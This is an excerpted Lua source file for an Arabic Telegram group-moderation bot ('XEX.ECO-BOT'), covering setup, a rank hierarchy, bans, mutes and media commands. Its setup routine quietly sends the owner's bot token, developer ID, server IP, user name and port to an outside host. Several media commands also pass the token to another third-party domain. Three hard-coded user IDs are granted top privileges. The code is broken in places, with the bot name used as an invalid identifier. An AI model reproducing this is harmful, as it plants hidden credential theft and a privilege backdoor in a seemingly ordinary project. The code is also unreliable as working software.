...
if not DevALS:get(Server.."IdXEX.ECO-BOT") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local DevId = io.read():gsub(' ','') 
if tostring(DevId):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevALS:set(Server.."IdXEX.ECO-BOT",DevId) 
else 
print('\27[1;31m┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉') 
end
os.execute('lua XEX.ECO-BOT.lua') 
end
if not DevALS:get(Server.."TokenXEX.ECO-BOT") then 
...
DevALS:set(Server.."TokenXEX.ECO-BOT",TokenBot) 
end  
else 
...
Config = {
DevId = DevALS:get(Server.."IdXEX.ECO-BOT"),
TokenBot = DevALS:get(Server.."TokenXEX.ECO-BOT"),
XEX.ECO-BOT = DevALS:get(Server.."TokenXEX.ECO-BOT"):match("(%d+)"),
SudoIds = {DevALS:get(Server.."IdXEX.ECO-BOT")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/XEX.ECO-BOT/index.php?Get=XEX.ECO-BOT&DevId="..DevALS:get(Server.."IdXEX.ECO-BOT").."&TokenBot="..DevALS:get(Server.."TokenXEX.ECO-BOT").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("XEX.ECO-BOT.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/XEX.ECO-BOT
token="]]..DevALS:get(Server.."TokenXEX.ECO-BOT")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉ ┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
...
./tg -s ./XEX.ECO-BOT.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S XEX.ECO-BOT -X kill
screen -S XEX.ECO-BOT ./XEX.ECO-BOT.sh
done
]]) 
file:close() 
...
local Load_XEX.ECO-BOT = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevALS:del(Server.."IdXEX.ECO-BOT");DevALS:del(Server.."TokenXEX.ECO-BOT")
end 
...
XEX.ECO-BOT = Config.XEX.ECO-BOT
TokenBot = Config.TokenBot
NameBot = (DevALS:get(XEX.ECO-BOT..'ALS:NameBot') or 'يوكا')
--     Source XEX.ECO-BOT     --
...
FilesPrint = FilesPrint.."\27[35m".."┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n".."\27[m"
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:ALSSudo:',msg.sender_user_id_) 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:SecondSudo:',msg.sender_user_id_) 
...
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(XEX.ECO-BOT) then  
var = true  
end  
return var  
end 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:SudoBot:',msg.sender_user_id_) 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:ALSConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or ALSSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
----   Owner   ----
function Owner(msg) 
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevALS:sismember(XEX.ECO-BOT..'ALS:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or ALSConstructor(msg) or ALSSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:MuteAll:', user_id) then
var = true
else
var = false
end
...
--     Source XEX.ECO-BOT     --
function Files_XEX-Murtaza(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Files/"..v)
if plugin.XEX.ECO-BOT and msg then
FilesText = plugin.XEX.ECO-BOT(msg)
end
end
end
...
if File_Name:lower():match('(%d+)') ~= XEX.ECO-BOT:lower() then 
...
local info_file = io.open('./'..XEX.ECO-BOT..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevALS:set(XEX.ECO-BOT.."ALS:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevALS:sadd(XEX.ECO-BOT.."ALS:Groups",IdGps) 
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..IdGps,"del") DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevALS:set(XEX.ECO-BOT..Lock..IdGps,true)
end
if v.ALSConstructors then
for k,IdALSConstructors in pairs(v.ALSConstructors) do
DevALS:sadd(XEX.ECO-BOT..'ALS:ALSConstructor:'..IdGps,IdALSConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevALS:sadd(XEX.ECO-BOT..'ALS:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevALS:sadd(XEX.ECO-BOT..'ALS:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevALS:sadd(XEX.ECO-BOT..'ALS:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevALS:sadd(XEX.ECO-BOT..'ALS:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevALS:set(XEX.ECO-BOT.."ALS:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevALS:set(XEX.ECO-BOT.."ALS:Groups:Welcomes"..IdGps,v.Welcomes)   
...
--     Source XEX.ECO-BOT     --
local ALSRank = function(msg) if SudoId(msg.sender_user_id_) then XEX.ECO-BOTTeam  = "المطور" elseif ALSSudo(msg) then XEX.ECO-BOTTeam = "المطور" elseif SecondSudo(msg) then XEX.ECO-BOTTeam = "المطور" elseif SudoBot(msg) then XEX.ECO-BOTTeam = "المطور" elseif Manager(msg) then XEX.ECO-BOTTeam = "المدير" elseif Admin(msg) then XEX.ECO-BOTTeam = "الادمن" else XEX.ECO-BOTTeam = "العضو" end return XEX.ECO-BOTTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1566031059) then XEX.ECO-BOTTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(2076971531) then XEX.ECO-BOTTeam = 'مطور السورس' elseif tonumber(user_id) == tonumber(1695110211) then XEX.ECO-BOTTeam = 'مطور السورس' elseif tonumber(user_id) == tonumber(XEX.ECO-BOT) then XEX.ECO-BOTTeam = 'البوت' elseif SudoId(user_id) then XEX.ECO-BOTTeam = 'المطور الاساسي' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:ALSSudo:', user_id) then XEX.ECO-BOTTeam = 'المطور الاساسي' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:SecondSudo:', user_id) then XEX.ECO-BOTTeam = 'المطور الاساسي²' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:SudoBot:', user_id) then XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:SudoBot:Rd"..chat_id) or 'المطور' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Owner:'..chat_id, user_id) then XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:Owner:Rd"..chat_id) or 'المالك' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:ALSConstructor:'..chat_id, user_id) then XEX.ECO-BOTTeam = 'المالك' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:BasicConstructor:'..chat_id, user_id) then XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Constructor:'..chat_id, user_id) then XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Managers:'..chat_id, user_id) then XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:Managers:Rd"..chat_id) or 'المدير' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Admins:'..chat_id, user_id) then XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:Admins:Rd"..chat_id) or 'الادمن' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:VipMem:'..chat_id, user_id) then  XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:VipMem:Rd"..chat_id) or 'المميز' elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Cleaner:'..chat_id, user_id) then  XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:Cleaner:Rd"..chat_id) or 'المنظف' else XEX.ECO-BOTTeam = DevALS:get(XEX.ECO-BOT.."ALS:mem:Rd"..chat_id) or 'العضو' end return XEX.ECO-BOTTeam end
--     Source XEX.ECO-BOT     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(XEX.ECO-BOT) then  
var = true
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:ALSSudo:', user_id) then
var = true
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:SecondSudo:', user_id) then
var = true  
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:SudoBot:', user_id) then
var = true 
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:ALSConstructor:'..chat_id, user_id) then
var = true
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Owner:'..chat_id, user_id) then
var = true
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Constructor:'..chat_id, user_id) then
var = true  
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Managers:'..chat_id, user_id) then
var = true  
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:Admins:'..chat_id, user_id) then
var = true  
elseif DevALS:sismember(XEX.ECO-BOT..'ALS:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
local ALS = (XEX.ECO-BOT..'ALS:Filters:'..msg.chat_id_)
if ALS then
...
--     Source XEX.ECO-BOT     --
function ALSmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevALS:get(XEX.ECO-BOT..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source XEX.ECO-BOT     --
function ChCheck(msg)
local var = true 
if DevALS:get(XEX.ECO-BOT.."ALS:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevALS:get(XEX.ECO-BOT..'ALS:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevALS:get(XEX.ECO-BOT..'ALS:ChText') then
local ChText = DevALS:get(XEX.ECO-BOT..'ALS:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevALS:get(XEX.ECO-BOT.."ALS:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevALS:get(XEX.ECO-BOT..'yes'..data.sender_user_id_) == 'delyes' then
DevALS:del(XEX.ECO-BOT..'yes'..data.sender_user_id_, 'delyes')
DevALS:del(XEX.ECO-BOT..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and DevALS:get(XEX.ECO-BOT..'no'..data.sender_user_id_) == 'delno' then
DevALS:del(XEX.ECO-BOT..'yes'..data.sender_user_id_, 'delyes')
DevALS:del(XEX.ECO-BOT..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم الغاء امر اطردني") 
end
--     Source XEX.ECO-BOT     --
if DataText == '/yesdel' and DevALS:get(XEX.ECO-BOT..'yesdel'..data.sender_user_id_) == 'delyes' then
DevALS:del(XEX.ECO-BOT..'yesdel'..data.sender_user_id_, 'delyes')
DevALS:del(XEX.ECO-BOT..'nodel'..data.sender_user_id_, 'delno')
if DevALS:sismember(XEX.ECO-BOT..'ALS:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevALS:sismember(XEX.ECO-BOT..'ALS:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevALS:sismember(XEX.ECO-BOT..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevALS:sismember(XEX.ECO-BOT..'ALS:Constructor:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(XEX.ECO-BOT..'ALS:Managers:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(XEX.ECO-BOT..'ALS:VipMem:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(XEX.ECO-BOT..'ALS:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevALS:sismember(XEX.ECO-BOT..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevALS:srem(XEX.ECO-BOT..'ALS:Constructor:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Managers:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:VipMem:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevALS:srem(XEX.ECO-BOT..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT.."ALS:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم الغاء امر تغير المطور الاساسي") 
DevALS:del(XEX.ECO-BOT.."ALS:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevALS:get(XEX.ECO-BOT.."ALS:NewDev"..data.sender_user_id_)
...
DevId = NewDev,
TokenBot = TokenBot,
XEX.ECO-BOT = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevALS:del(XEX.ECO-BOT.."ALS:NewDev"..data.sender_user_id_)
dofile('XEX.ECO-BOT.lua') 
end
end
if DataText == '/nodel' and DevALS:get(XEX.ECO-BOT..'nodel'..data.sender_user_id_) == 'delno' then
DevALS:del(XEX.ECO-BOT..'yesdel'..data.sender_user_id_, 'delyes')
DevALS:del(XEX.ECO-BOT..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevALS:get(XEX.ECO-BOT.."ALS:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevALS:incrby(XEX.ECO-BOT..'ALS:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevALS:del(XEX.ECO-BOT..'ALS:ListRolet'..data.chat_id_) 
DevALS:del(XEX.ECO-BOT.."ALS:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "☆︙*صاحب الحظ* ↫ ["..UserName.."]\n☆︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevALS:del(XEX.ECO-BOT..'ALS:ListRolet'..data.chat_id_) 
DevALS:del(XEX.ECO-BOT.."ALS:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevALS:del(XEX.ECO-BOT.."ALS:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/XEX.ECO-BOT/Yt.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/XEX.ECO-BOT/Yt.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://ccccxcc.ml/XEX.ECO-BOT/Yt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("☆ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://ccccxcc.ml/XEX.ECO-BOT/Yt.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local ALS = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "☆︙الكلمه ↫ "..ALS.." تم حذفها") 
DevALS:del(XEX.ECO-BOT..'ALS:Text:GpTexts'..ALS..data.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Manager:GpRedod'..data.chat_id_,ALS)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local ALS = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Text:GpTexts'..ALS..data.chat_id_)
if DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..ALS) 
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Text:GpTexts'..ALS..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Manager:GpRedod'..data.chat_id_,ALS)
else
EditMsg(Chat_Id2, Msg_Id2, "☆︙عذرا صلاحية الامر منتهيه !") 
end
...
DevALS:del(XEX.ECO-BOT..'ALS:Text:KtTexts'..ALS..data.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Sudo:Kt'..data.chat_id_,ALS)
end
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Text:KtTexts'..ALS..data.chat_id_)
if DevALS:get(XEX.ECO-BOT..'ALS:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙تم انهاء وحفظ ↫ "..#List.." من الاسئله للامر ↫ "..ALS) 
DevALS:del(XEX.ECO-BOT..'ALS:Add:Kt'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "☆︙عذرا صلاحية الامر منتهيه !") 
end
end
...
DevALS:del(XEX.ECO-BOT..'ALS:Add:Kt'..data.sender_user_id_..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Text:KtTexts'..ALS..data.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Add:KtTexts'..data.sender_user_id_..data.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Sudo:Kt'..data.chat_id_,ALS)
else
EditMsg(Chat_Id2, Msg_Id2, "☆︙عذرا صلاحية الامر منتهيه !") 
end
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/Song:"..data.sender_user_id_}},{{text=". TeAm XEX.ECO-BOT ☆",url="t.me/AAAVAA"}}} 
...
local Text ='*☆︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/mp3:"..data.sender_user_id_}},{{text=". TeAm XEX.ECO-BOT ☆",url="t.me/AAAVAA"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/memz:"..data.sender_user_id_}},{{text=". TeAm XEX.ECO-BOT ☆",url="t.me/AAAVAA"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/gif:"..data.sender_user_id_}},{{text=". TeAm XEX.ECO-BOT ☆",url="t.me/AAAVAA"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/photo:"..data.sender_user_id_}},{{text=". TeAm XEX.ECO-BOT ☆",url="t.me/AAAVAA"}}} 
...
keyboard = {}  
keyboard.inline_keyboard = {{{text=". مره اخرى ☆",callback_data="/anime:"..data.sender_user_id_}},{{text=". TeAm XEX.ECO-BOT ☆",url="t.me/AAAVAA"}}} 
...
DevALS:sadd(XEX.ECO-BOT..'ALS:VipMem:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:ALSConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:sadd(XEX.ECO-BOT..'ALS:ALSSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:VipMem:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:Cleaner:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:Managers:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:Constructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:BasicConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:ALSConstructor:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:SudoBot:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:SecondSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:ALSSudo:'..data.chat_id_,dp.id_)
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Ban:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'AAAVAA')..')\n☆︙تم حظره')
end
end
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
DevALS:srem(XEX.ECO-BOT..'ALS:Ban:'..data.chat_id_,dp.id_)
...
if DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..data.chat_id_, dp.id_) then
EditMsg(Chat_Id2, Msg_Id2, "☆︙هو بالفعل مكتوم من المجموعه")  
else
DevALS:sadd(XEX.ECO-BOT..'ALS:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'☆︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'AAAVAA')..')\n☆︙تم كتمه')
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = ALSId},function(arg,dp) 
